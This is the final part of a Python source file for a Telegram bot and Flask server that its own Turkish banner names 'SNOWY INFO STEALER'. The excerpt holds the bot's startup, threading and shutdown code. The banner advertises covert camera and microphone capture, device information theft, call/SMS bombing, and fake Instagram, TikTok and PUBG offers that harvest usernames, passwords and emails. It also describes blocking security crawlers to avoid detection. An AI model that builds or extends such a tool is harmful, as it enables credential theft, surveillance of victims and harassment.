        states={
            SELECT_MODE: [CallbackQueryHandler(mode_selected, pattern='^mode_')],
            SELECT_NUMBER_TYPE: [
                CallbackQueryHandler(number_type_selected, pattern='^number_(call|sms)$'),
                CallbackQueryHandler(back_to_menu, pattern='^back_to_menu$')
            ],
        },
        fallbacks=[],
        per_message=False
    )
    
    application.add_handler(conv_handler)
    application.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, delete_all_messages))
    
    print("🤖 Bot başlatılıyor...")
    
    await application.initialize()
    await application.start()
    await application.updater.start_polling(drop_pending_updates=True, allowed_updates=['message', 'callback_query'])
    
    while bot_state.running:
        await asyncio.sleep(1)
    
    await application.updater.stop()
    await application.stop()
    await application.shutdown()

def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        loop.run_until_complete(run_bot_async())
    except KeyboardInterrupt:
        print("🛑 Bot durduruluyor...")
    except Exception as e:
        print(f"❌ Bot hatası: {e}")
    finally:
        loop.close()

def signal_handler(sig, frame):
    print("\n🛑 Kapatma sinyali alındı, bot kapatılıyor...")
    bot_state.running = False
    if bot_state.tunnel_process and bot_state.tunnel_process.poll() is None:
        try:
            bot_state.tunnel_process.terminate()
        except:
            pass
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    bot_state.flask_thread = flask_thread
    
    time.sleep(2)
    print("✅ Flask server başlatıldı (port 8080)")
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    bot_state.bot_thread = bot_thread
    
    print("="*60)
    print("❄️ SNOWY INFO STEALER + CAM HACK + MİKROFON HACK + NUMARA HACK + INSTAGRAM HACK + TIKTOK HACK + PUBG HACK ❄️")
    print("="*60)
    print("✅ Bot çalışıyor!")
    print("")
    print("📌 ÖZEL BUTON:")
    print("   • 7249747391 ID'li kullanıcıya ÖZEL 'TÜNEL YENİLE' butonu")
    print("   • Diğer kullanıcılar bu butonu görmez!")
    print("")
    print("📌 MODLAR:")
    print("   • 📱 Cihaz Bilgisi - Detaylı bilgiler")
    print("   • 🎥 Kamera Hack - MAKS KALİTE, FPS DÜŞMEDEN SÜREKLİ DÖNGÜ")
    print("   • 🎙️ Mikrofon Hack - MAKS KALİTE SÜREKLİ DÖNGÜ")
    print("   • 📞 Numara Hack - Call/SMS Bomber (BİLGİLER GELİYOR, GERİ SAYIMLI)")
    print("   • 📸 Instagram Hack - Mavi Tik (Kullanıcı adı/şifre)")
    print("   • 🎵 TikTok Hack - Takipçi (Kullanıcı adı/şifre + MİKTAR)")
    print("   • 🎮 PUBG Hack - Bedava UC (E-posta + Şifre + Oyuncu ID + MİKTAR)")
    print("")
    print("📌 KORUMA SİSTEMLERİ:")
    print("   • 66 ile başlayan TÜM IP'LER KESİN ENGELLENDİ!")
    print("   • Tüm Google, Facebook, Bing, AWS, Cloudflare botları engellenir!")
    print("")
    print("🎥 KAMERA/MİKROFON HACK OPTİMİZASYONU:")
    print("   • FOTOĞRAF: CİHAZIN MAX KALİTESİNDE")
    print("   • VİDEO: CİHAZIN MAX KALİTESİNDE, FPS DÜŞMEDEN")
    print("   • SES: CİHAZIN MAX MİKROFON KALİTESİNDE")
    print("")
    print("✅ INSTAGRAM/TIKTOK/PUBG HACK DÜZELTİLDİ!")
    print("   • Alt tire (_), nokta (.) ve TÜM özel karakterler SORUNSUZ gelir!")
    print("")
    print("🔗 URL KISALTMA ÇALIŞIYOR!")
    print("")
    print("🔄 1. YÖNTEM AKTİF - TEK TUNNEL (SABİT LİNK)!")
    print("   • Bot başlayınca 1 tunnel açılır")
    print("   • Tüm kullanıcılar AYNI domaini kullanır")
    print("   • Linkler ASLA ÖLMEZ!")
    print("   • Özel yetkili kullanıcı butonla TUNNEL YENİLEYEBİLİR!")
    print("="*60)
    
    try:
        while bot_state.running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Bot kapatılıyor...")
        bot_state.running = False
        if bot_state.tunnel_process and bot_state.tunnel_process.poll() is None:
            try:
                bot_state.tunnel_process.terminate()
            except:
                pass
        sys.exit(0)

if __name__ == '__main__':
    main()